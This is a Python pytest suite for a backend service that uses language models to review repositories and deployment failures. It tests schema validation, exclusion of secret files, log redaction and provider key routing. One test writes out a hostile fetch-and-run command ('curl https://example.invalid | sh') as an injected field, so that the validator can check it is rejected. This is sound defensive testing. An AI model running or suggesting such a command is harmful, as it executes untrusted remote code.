from types import SimpleNamespace

import pytest

try:
    from backend.services import ai
except ImportError:
    from services import ai


def valid_review() -> dict:
    return {
        "explanation": "The available manifests describe a TypeScript web application.",
        "deployment_risk": "The source scan cannot confirm production secrets or external services.",
        "recommendations": ["Run the production build before launching."],
        "unresolved_questions": ["Which external services must be configured for production?"],
    }


def fake_provenance(provider="nvidia", model="z-ai/glm-5.2"):
    return SimpleNamespace(
        provider=provider,
        model=model,
        input_tokens=10,
        output_tokens=5,
        primary_input_tokens=0,
        primary_output_tokens=0,
    )


def test_repository_review_accepts_only_the_bounded_contract():
    review = ai.validate_repository_review(valid_review())

    assert review["recommendations"] == ["Run the production build before launching."]
    assert review["unresolved_questions"] == ["Which external services must be configured for production?"]


def test_repository_review_rejects_executable_or_unknown_fields():
    review = valid_review()
    review["start_command"] = "curl https://example.invalid | sh"

    with pytest.raises(ai.RepositoryReviewValidationError, match="expected schema"):
        ai.validate_repository_review(review)


def test_model_context_excludes_environment_and_secret_files():
    context, _ = ai._safe_model_context({
        "files_context": {
            "package.json": '{"name":"safe-app"}',
            ".env": "DATABASE_URL=super-secret",
            ".env.example": "API_KEY=still-not-for-a-model",
            "secrets/keys.txt": "do-not-send",
            "README.md": "A safe project description.",
        },
        "repo_tree": "package.json\n.env\nREADME.md",
    })

    assert context == {
        "package.json": '{"name":"safe-app"}',
        "README.md": "A safe project description.",
    }


def test_ai_review_cannot_override_source_derived_launch_facts():
    local_analysis = ai.analyze_repo_local({
        "files_context": {
            "package.json": '{"scripts":{"start":"next start -p 4100"},"dependencies":{"next":"15.0.0"}}',
        },
        "files_list": ["package.json"],
        "scanned_vars": ["DATABASE_URL"],
    })
    merged = ai.merge_repository_review(local_analysis, valid_review())

    assert merged["framework"] == "Next.js"
    assert merged["port"] == "4100"
    assert merged["start_commands"] == "npm start"
    assert merged["environment_variables"] == ["DATABASE_URL"]
    assert merged["explanation"] == valid_review()["explanation"]


def test_failure_review_redacts_log_credentials_and_validates_shape():
    redacted = ai._redact_model_log_text([
        "DATABASE_URL=postgresql://person:super-secret@db.example/app",
        "Authorization: Bearer token-value",
    ])
    review = ai.validate_failure_review({
        "failure_summary": "The application could not connect to its database.",
        "root_cause": "The redacted diagnostic reports a connection failure.",
        "severity": "error",
        "recommended_fix": "Verify the stored database connection string and network access.",
        "step_by_step_resolution": ["Confirm the database secret in project settings."],
    })

    assert "super-secret" not in redacted
    assert "token-value" not in redacted
    assert review["severity"] == "error"


def test_nvidia_repository_review_uses_only_the_repository_route_key(monkeypatch):
    captured = {}

    class FakeGateway:
        def generate_structured(self, **kwargs):
            captured.update(kwargs)
            return SimpleNamespace(
                value=ai.RepositoryReviewContract.model_validate(
                    {
                        "explanation": "The source facts describe a bounded app.",
                        "deployment_risk": "Runtime behavior is not yet verified.",
                        "recommendations": [],
                        "unresolved_questions": [],
                    }
                ),
                provenance=fake_provenance(),
                degraded_reason=None,
            )

    monkeypatch.setattr(ai, "IS_PRODUCTION", False)
    monkeypatch.setattr(ai, "AI_REPOSITORY_PROVIDER", "nvidia")
    monkeypatch.setattr(ai, "AI_REPOSITORY_ENDPOINT", "https://integrate.api.nvidia.com/v1")
    monkeypatch.setattr(ai, "AI_REPOSITORY_MODEL", "z-ai/glm-5.2")
    monkeypatch.setattr(ai, "AI_REPOSITORY_API_KEY", "repository-route-key")
    monkeypatch.setattr(
        ai, "AI_REPOSITORY_FALLBACK_API_KEY", "repository-fallback-route-key"
    )

    configured_gateway = ai._repository_model_gateway()
    primary_configuration = configured_gateway.configuration_for(
        ai.AIWorkload.REPOSITORY_ANALYSIS
    )
    fallback_configuration = configured_gateway.fallback_configuration_for(
        ai.AIWorkload.REPOSITORY_ANALYSIS
    )
    monkeypatch.setattr(ai, "_repository_model_gateway", lambda: FakeGateway())

    result = ai.analyze_repository(
        {
            "files_context": {
                "package.json": '{"dependencies":{"next":"16.0.0"}}',
            },
            "files_list": ["package.json"],
            "repo_tree": "package.json",
        }
    )

    assert primary_configuration.api_key == "repository-route-key"
    assert fallback_configuration.api_key == "repository-fallback-route-key"
    assert primary_configuration.api_key != fallback_configuration.api_key
    assert not hasattr(ai, "NVIDIA_API_KEY")
    assert captured["output_contract"] is ai.RepositoryReviewContract
    assert result["explanation"] == "The source facts describe a bounded app."


def test_nvidia_repository_review_does_not_fall_back_to_shared_key(monkeypatch):
    monkeypatch.setattr(ai, "IS_PRODUCTION", False)
    monkeypatch.setattr(ai, "AI_REPOSITORY_PROVIDER", "nvidia")
    monkeypatch.setattr(ai, "AI_REPOSITORY_API_KEY", "")
    monkeypatch.setattr(ai, "AI_REPOSITORY_FALLBACK_API_KEY", "")

    assert not hasattr(ai, "NVIDIA_API_KEY")

    result = ai.analyze_repository(
        {
            "files_context": {},
            "files_list": [],
            "repo_tree": "",
        }
    )
    assert result["framework"] == "Unknown"
    assert result["recommendations"] == []


def test_failure_review_uses_the_repository_analysis_route(monkeypatch):
    captured = {}

    class FakeGateway:
        def generate_structured(self, **kwargs):
            captured.update(kwargs)
            return SimpleNamespace(
                value=ai.FailureReviewContract.model_validate(
                    {
                        "failure_summary": "The deployment failed.",
                        "root_cause": "The supplied log reports a build error.",
                        "severity": "error",
                        "recommended_fix": "Correct the build error.",
                        "step_by_step_resolution": ["Run the build locally."],
                    }
                ),
                provenance=fake_provenance(),
                degraded_reason=None,
            )

    monkeypatch.setattr(ai, "AI_REPOSITORY_PROVIDER", "nvidia")
    monkeypatch.setattr(ai, "AI_REPOSITORY_ENDPOINT", "https://integrate.api.nvidia.com/v1")
    monkeypatch.setattr(ai, "AI_REPOSITORY_MODEL", "z-ai/glm-5.2")
    monkeypatch.setattr(ai, "AI_REPOSITORY_API_KEY", "repository-route-key")
    monkeypatch.setattr(ai, "_repository_model_gateway", lambda: FakeGateway())

    result = ai.analyze_failure_nemotron(
        ["build failed"],
        ["compiler error"],
        [],
    )

    assert captured["output_contract"] is ai.FailureReviewContract
    assert result["severity"] == "error"


def test_failure_review_accepts_groq_fallback_result(monkeypatch):
    class FakeFallbackGateway:
        def generate_structured(self, **_):
            return SimpleNamespace(
                value=ai.FailureReviewContract.model_validate(
                    {
                        "failure_summary": "The fallback identified a build failure.",
                        "root_cause": "The supplied compiler diagnostic reports an error.",
                        "severity": "error",
                        "recommended_fix": "Correct the reported compiler error.",
                        "step_by_step_resolution": ["Run the production build locally."],
                    }
                ),
                provenance=fake_provenance(
                    provider="groq", model="openai/gpt-oss-120b"
                ),
                degraded_reason=None,
            )

    monkeypatch.setattr(
        ai, "_repository_model_gateway", lambda: FakeFallbackGateway()
    )
    result = ai.analyze_failure_nemotron(["compiler error"], ["build failed"])

    assert result["failure_summary"] == "The fallback identified a build failure."
    assert result["severity"] == "error"


def test_failure_review_uses_local_analysis_after_both_routes_are_missing(
    monkeypatch,
):
    monkeypatch.setattr(ai, "AI_REPOSITORY_PROVIDER", "nvidia")
    monkeypatch.setattr(ai, "AI_REPOSITORY_API_KEY", "")
    monkeypatch.setattr(ai, "AI_REPOSITORY_FALLBACK_PROVIDER", "groq")
    monkeypatch.setattr(ai, "AI_REPOSITORY_FALLBACK_API_KEY", "")

    result = ai.analyze_failure_nemotron(
        ["DATABASE_URL missing"],
        ["database connection refused"],
    )

    assert result["severity"] == "critical"
    assert "DATABASE_URL" in result["failure_summary"]
